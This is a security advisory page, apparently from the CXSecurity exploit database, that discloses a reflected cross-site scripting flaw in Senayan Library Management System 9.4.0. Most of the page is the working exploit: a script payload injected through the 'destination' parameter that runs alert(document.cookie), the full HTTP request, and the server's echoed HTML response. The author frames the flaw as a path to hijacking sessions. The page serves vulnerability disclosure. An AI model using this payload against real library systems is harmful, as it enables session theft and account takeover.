---
title: Senayan Library Management System 9.4.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022120024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-12
fetch_date: 2025-10-04T01:14:13.546047
---

# Senayan Library Management System 9.4.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.4.0 Cross Site Scripting** **2022.12.11**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: Senayan Library Management System v9.4.0 a.k.a SLIMS 9
XSS-Reflected- PHPSESSID Hijacking
## Author: nu11secur1ty
## Date: 12.08.2022
## Vendor: https://slims.web.id/web/
## Software: https://slims.web.id/web/news/rilis-9.4.0/
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.4.0
## Description:
The value of the `destination` request parameter is copied into the
value of an HTML tag attribute which is encapsulated in double
quotation marks.
The payload zbuip"><script>alert(hello\_vulnerability)</script>jgoihbmmygl
was submitted in the destination parameter.
This input was echoed unmodified in the application's response. The
attacker can hijack the session of some users of the system.
## STATUS: HIGH Vulnerability
[+] Payload:
```GET
GET /slims9\_bulian-9.4.0/index.php?p=member&destination=zbuip%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ejgoihbmmygl&memberID=admin&memberPassWord=password&\_csrf\_token\_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&logMeIn=Login
HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: SenayanMember=82qkie4ai1alsk0gtbge7rc48m
Origin: http://pwnedhost.com
Upgrade-Insecure-Requests: 1
Referer: http://pwnedhost.com/slims9\_bulian-9.4.0/index.php?p=member
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="107", "Chromium";v="107"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```
[+] Response:
```HTTP/1
HTTP/1.1 200 OK
Date: Thu, 08 Dec 2022 18:43:20 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
X-Frame-Options: SAMEORIGIN
X-Powered-By: PHP/7.4.30
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 30590
<!--
# ===============================
# Classic SLiMS Template
# ===============================
# @Author: Waris Agung Widodo
# @Email: ido.alit@gmail.com
# @Date: 2018-01-23T11:25:57+07:00
# @Last modified by: Waris Agung Widodo
# @Last modified time: 2019-01-03T11:25:57+07:00
-->
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Open Source Library Management System | Senayan</title>
<meta name="viewport" content="width=device-width,
initial-scale=1, shrink-to-fit=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<meta http-equiv="Pragma" content="no-cache"/>
<meta http-equiv="Cache-Control" content="no-store, no-cache,
must-revalidate, post-check=0, pre-check=0"/>
<meta http-equiv="Expires" content="Sat, 26 Jul 1997 05:00:00 GMT"/>
<meta name="robots" content="noindex, follow"> <meta
name="description" content="Open Source Library Management System |
Senayan">
<meta name="keywords" content="Open Source Library Management System">
<meta name="viewport" content="width=device-width,
height=device-height, initial-scale=1">
<meta name="generator" content="SLiMS 9 (Bulian)">
<meta name="theme-color" content="#000">
<meta property="og:locale" content="en\_US"/>
<meta property="og:type" content="book"/>
<meta property="og:title" content="Open Source Library Management
System | Senayan"/>
<meta property="og:description" content="Open Source Library
Management System"/>
<meta property="og:url"
content="//pwnedhost.com%2Fslims9\_bulian-9.4.0%2Findex.php%3Fp%3Dmember%26destination%3Dzbuip%22%3Ealert%28document.cookie%29jgoihbmmygl%26memberID%3Dadmin%26memberPassWord%3Dpassword%26\_csrf\_token\_645a83a41868941e4692aa31e7235f2%3D6a50886006f02202a6dac5cfa07bcbfb1e2a6e84%26logMeIn%3DLogin"/>
<meta property="og:site\_name" content="Senayan"/>
<meta property="og:image"
content="//pwnedhost.com/slims9\_bulian-9.4.0/template/default/img/logo.png"/>
<meta name="twitter:card" content="summary">
<meta name="twitter:url"
content="//pwnedhost.com%2Fslims9\_bulian-9.4.0%2Findex.php%3Fp%3Dmember%26destination%3Dzbuip%22%3Ealert%28document.cookie%29jgoihbmmygl%26memberID%3Dadmin%26memberPassWord%3Dpassword%26\_csrf\_token\_645a83a41868941e4692aa31e7235f2%3D6a50886006f02202a6dac5cfa07bcbfb1e2a6e84%26logMeIn%3DLogin"/>
<meta name="twitter:title" content="Open Source Library Management
System | Senayan"/>
<meta property="twitter:image"
content="//pwnedhost.com/slims9\_bulian-9.4.0/template/default/img/logo.png"/>
<!-- // load bootstrap style -->
<link rel="stylesheet" href="template/default/assets/css/bootstrap.min.css">
<!-- // font awesome -->
<link rel="stylesheet"
href="template/default/assets/plugin/font-awesome/css/fontawesome-all.min.css">
<!-- Tailwind CSS -->
<link rel="stylesheet" href="template/default/assets/css/tailwind.min.css">
<!-- Vegas CSS -->
<link rel="stylesheet"
href="template/default/assets/plugin/vegas/vegas.min.css">
<link href="/slims9\_bulian-9.4.0/js/toastr/toastr.min.css?31014320"
rel="stylesheet" type="text/css"/>
<!-- SLiMS CSS -->
<link rel="stylesheet" href="/slims9\_bulian-9.4.0/js/colorbox/colorbox.css">
<!-- // Flag css -->
<link rel="stylesheet" href="template/default/assets/css/flag-icon.min.css">
<!-- // my custom style -->
<link rel="stylesheet"
href="template/default/assets/css/style.css?v=20221209-014320">
<link rel="shortcut icon" href="webicon.ico" type="image/x-icon"/>
<!-- // load vue js -->
<script src="template/default/assets/js/vue.min.js"></script>
<!-- // load jquery library -->
<script src="template/default/assets/j...